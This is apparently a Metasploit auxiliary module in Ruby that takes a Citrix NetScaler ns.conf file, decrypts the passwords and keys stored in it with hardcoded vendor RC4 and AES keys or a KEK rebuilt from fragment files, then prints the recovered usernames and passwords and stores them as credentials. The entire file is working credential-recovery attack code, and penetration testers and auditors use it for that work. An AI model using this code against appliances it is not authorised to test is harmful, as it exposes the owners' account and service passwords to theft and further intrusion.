##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Decrypt Citrix NetScaler Config Secrets',
        'Description' => %q{
          This module takes a Citrix NetScaler ns.conf configuration file as
          input and extracts secrets that have been stored with reversible
          encryption. The module supports legacy NetScaler encryption (RC4)
          as well as the newer AES-256-ECB and AES-256-CBC encryption types.
          It is also possible to decrypt secrets protected by the Key
          Encryption Key (KEK) method, provided the key fragment files F1.key
          and F2.key are provided.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'bsd' ],
        'DisclosureDate' => '2022-05-19',
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://dozer.nz/posts/citrix-decrypt/'],
          ['URL', 'https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump secrets from NetScaler configuration'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptPath.new('NS_CONF', [ true, 'Path to a NetScaler configuration file (ns.conf)' ]),
      OptPath.new('NS_KEK_F1', [ false, 'Path to NetScaler KEK fragment file F1.key' ]),
      OptPath.new('NS_KEK_F2', [ false, 'Path to NetScaler KEK fragment file F2.key' ]),
      OptString.new('NS_IP', [ false, '(Optional) IPv4 address to attach to loot' ])
    ])
  end

  def loot_host
    datastore['NS_IP'] || '127.0.0.1'
  end

  def ns_conf
    datastore['NS_CONF']
  end

  def ns_kek_f1
    datastore['NS_KEK_F1']
  end

  def ns_kek_f2
    datastore['NS_KEK_F2']
  end

  # ns.conf elements that contain potential secrets, update as needed
  # k = parameter that has the secret (-key, -password, [...])
  # v = start of config line that potentially has a secret
  def ns_secret
    {
      'key' => ['add ssl certKey'],
      'keyValue' => ['set ns encryptionParams'],
      'radKey' => ['add authentication radiusAction'],
      'ldapBindDnPassword' => ['add authentication ldapAction'],
      'password' => ['set ns rpcNode', 'add lb monitor', 'add aaa user'],
      'passPhrase' => ['add authentication dfaAction']
    }
  end

  # Statically defined in libnscli90.so, modern appliances keep these in /nsconfig/.skf
  def ns90_rc4key
    '2286da6ca015bcd9b7259753c2a5fbc2'.scan(/../).map(&:hex).pack('C*')
  end

  def ns90_aeskey
    '351cbe38f041320f22d990ad8365889c7de2fcccae5a1a8707e21e4adccd4ad9'.scan(/../).map(&:hex).pack('C*')
  end

  def run
    if ns_kek_f1 && ns_kek_f2
      print_status('Building NetScaler KEK from key fragments ...')
      build_ns_kek
    end
    parse_ns_config
  end

  def build_ns_kek
    unless File.size(ns_kek_f1) == 256 && File.size(ns_kek_f2) == 256
      print_error('KEK files must be 256 bytes in size')
      return false
    end
    f1_hex = File.binread(ns_kek_f1)
    f2_hex = File.binread(ns_kek_f2)
    unless f1_hex.match?(/^[0-9a-f]+$/i)
      print_error('Provided F1.key is not valid hexidecimal data')
      raise Msf::OptionValidateError, ['NS_KEK_F1']
    end
    unless f2_hex.match?(/^[0-9a-f]+$/i)
      print_error('Provided F2.key is not valid hexidecimal data')
      raise Msf::OptionValidateError, ['NS_KEK_F2']
    end
    f1_key = f1_hex[66..130].scan(/../).map(&:hex).pack('C*')
    f2_key = f2_hex[70..134].scan(/../).map(&:hex).pack('C*')
    f1_key_hex = f1_key.unpack('H*').first
    f2_key_hex = f2_key.unpack('H*').first
    print_good('NS KEK F1')
    print_good("\t HEX: #{f1_key_hex}")
    print_good('NS KEK F2')
    print_good("\t HEX: #{f2_key_hex}")
    @ns_kek_key = OpenSSL::HMAC.hexdigest('SHA256', f2_key, f1_key).scan(/../).map(&:hex).pack('C*')
    @ns_kek_key_hex = @ns_kek_key.unpack('H*').first
    print_good('Assembled NS KEK AES key')
    print_good("\t HEX: #{@ns_kek_key_hex}\n")
    true
  end

  def parse_ns_config
    ns_config_data = File.binread(ns_conf)
    ns_secret.each do |secret|
      element = secret[0]
      secret[1].each do |keyword|
        lines = ns_config_data.to_enum(:scan, /^#{keyword}.*/).map { Regexp.last_match }
        lines.each do |line|
          is_kek = false
          config_entry = line.to_s
          ciphertext = config_entry.to_enum(:scan, /#?([\da-f]{2})([\da-f]{2})([\da-f]{2})(\w+)/).map { Regexp.last_match }
          unless ciphertext.first
            ciphertext = config_entry.to_enum(:scan, /(-passcrypt.*(\s*))/).map { Regexp.last_match }
            next unless ciphertext.first
          end
          enc_type = config_entry.match(/encryptmethod (\w+)/).to_s.split(' ')[1].to_s
          if config_entry.match?(/-kek/)
            is_kek = true
          end
          print_status("Config line:\n#{config_entry}")
          if is_kek && !@ns_kek_key
            print_warning('Entry was encrypted with KEK but no KEK fragement files provided, decryption will not be possible')
            next
          end
          username = parse_username_from_config(config_entry)
          ciphertext.each do |encrypted|
            encrypted_entry = encrypted.to_s
            if encrypted_entry =~ /^[0-9a-f]+$/i
              ciphertext_bytes = encrypted_entry.scan(/../).map(&:hex).pack('C*')
            else
              ciphertext_b64 = encrypted_entry.split(' ')[1].delete('"')
              # TODO: Implement -passcrypt functionality
              # ciphertext_bytes = Base64.strict_decode64(ciphertext_b64)
              print_warning('Not decrypting passcrypt entry:')
              print_warning("Ciphertext: #{ciphertext_b64}")
              next
            end
            case enc_type
            when 'ENCMTHD_2' # aes-256-ecb
              if is_kek
                aeskey = @ns_kek_key
              else
                aeskey = ns90_aeskey
              end
              plaintext = ns_aes_ecb_decrypt(aeskey, ciphertext_bytes)
            when 'ENCMTHD_3' # aes-256-cbc
              if is_kek
                aeskey = @ns_kek_key
              else
                aeskey = ns90_aeskey
              end
              plaintext = ns_aes_cbc_decrypt(aeskey, ciphertext_bytes)
            else # rc4 (legacy)
              plaintext = ns_rc4_decrypt(ns90_rc4key, ciphertext_bytes)
            end
            next unless plaintext

            if username
              print_good("User: #{username}")
              print_good("Pass: #{plaintext}")
              store_valid_credential(user: username, private: plaintext)
            else
              print_good("Plaintext: #{plaintext}")
              store_valid_credential(user: element, private: plaintext)
            end
          end
        end
      end
    end
  end

  def parse_username_from_config(line)
    # Ugly but effective way to extract the principal name from a config line for loot storage
    # The whitespace prefixed to ' user' is intentional so that it does not clobber other parameters with 'user' in the pattern
    [' user', 'userName', '-clientID', '-bindDN', '-ldapBindDn'].each do |user_param|
      next unless line.match?(/#{user_param} (.+)/)

      user_name = line.match(/#{user_param} (.+)/).to_s.split(' ')[1].to_s
      if user_name.match?('"')
        user_name = line.match(/#{user_param} (.+")/).to_s.split('"')[1].to_s
      end
      return user_name
    end
    false
  end

  def ns_rc4_decrypt(rc4key, ciphertext_bytes)
    decipher = OpenSSL::Cipher.new('rc4')
    decipher.decrypt
    decipher.key = rc4key
    decipher.update(ciphertext_bytes)
  rescue OpenSSL::Cipher::CipherError
    print_error("#{__method__}: bad decrypt")
    return false
  end

  def ns_aes_ecb_decrypt(aeskey, ciphertext_bytes)
    decipher = OpenSSL::Cipher.new('aes-256-ecb')
    decipher.decrypt
    decipher.padding = 0
    decipher.key = aeskey
    (decipher.update(ciphertext_bytes) + decipher.final).delete("\000")
  rescue OpenSSL::Cipher::CipherError
    print_error("#{__method__}: bad decrypt")
    return false
  end

  def ns_aes_cbc_decrypt(aeskey, ciphertext_bytes)
    decipher = OpenSSL::Cipher.new('aes-256-cbc')
    iv = ciphertext_bytes[0, 16]
    ciphertext = ciphertext_bytes[16..]
    decipher.decrypt
    decipher.iv = iv
    decipher.padding = 1
    decipher.key = aeskey
    (decipher.update(ciphertext) + decipher.final).delete("\000")
  rescue OpenSSL::Cipher::CipherError
    print_error("#{__method__}: bad decrypt")
    return false
  end
end
